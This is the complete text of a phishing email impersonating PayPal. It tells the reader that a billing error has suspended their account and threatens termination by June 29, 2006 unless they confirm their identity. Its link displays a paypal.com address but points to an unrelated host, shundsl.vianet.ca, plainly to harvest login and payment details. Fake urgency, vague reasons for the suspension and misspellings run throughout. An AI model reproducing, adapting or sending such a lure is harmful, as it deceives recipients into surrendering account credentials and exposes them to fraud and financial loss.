 Dear PayPal Member, During our regularly schedule account maintenance and verification we have detected a slight error in your billing information on file with PayPal. This might be due to either following reasons: - A recent change in your personal information (i.e. change of address) - Submitting invalid information during the initial sign up process. - An inability to accurately verify your selected option of payment due an internal error within our processors. Therefore your account has been temporarily suspended. We need you to confirm your identity in order to regain full privileges of your account. If this is not completed by June 29, 2006, we reserve the right to terminate all privileges of your account indefinitly, as it may have been used for fraudulent purposes. We thank you for your cooperation in this manner. To confirm your identity please follow the link below: https://www.paypal.com/cgi-bin/webscr?cmd=_login-run (http://shundsl.vianet.ca:81/.confirm/index.php?MfcISAPICommand=SignInFPP) Thank you for your patience in this matter.
